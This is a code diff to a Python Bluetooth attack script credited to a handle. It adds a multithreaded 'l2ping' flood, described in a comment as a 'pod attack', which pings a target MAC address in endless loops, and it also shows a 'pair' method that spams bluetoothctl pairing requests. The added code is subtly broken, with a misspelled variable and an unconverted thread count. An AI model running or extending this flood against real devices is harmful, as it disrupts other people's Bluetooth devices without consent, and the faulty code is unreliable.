@@ -16,7 +16,7 @@ print("___.    __  .__      _____.__                    .___            \n\\_ |_
 print("widow9098#0353")
  
 if (len(sys.argv) != 4):
-    print("methods: pair/pod")
+    print("methods: pair/l2ping")
     print(sys.argv[0] + " <method> <mac> <threads>")    
 else:
     method = sys.argv[1]
@@ -24,13 +24,20 @@ else:
     threadnum = sys.argv[3]
  
  
-    if (method == "pod"):
+    if (method == "l2ping"):
         #start pod attack
+        def loopback():
+            while True: 
+                run_cmd("l2ping -c 1 -s 700 -t 3 " + macadd) 
+                print("sent packet to " + macadd)
+
         print("running " + method + " attack on " + macadd + " with " + threadnum + " threads")
+        for i in range(treadnum):
+            threading.Thread(target = loopback).start()
+        
     elif (method == "pair"):
         def loopback():
             while True:
-
                 run_cmd("bluetoothctl power on") 
                 run_cmd("bluetoothctl discoverable on") 
                 run_cmd("bluetoothctl pairable on") 
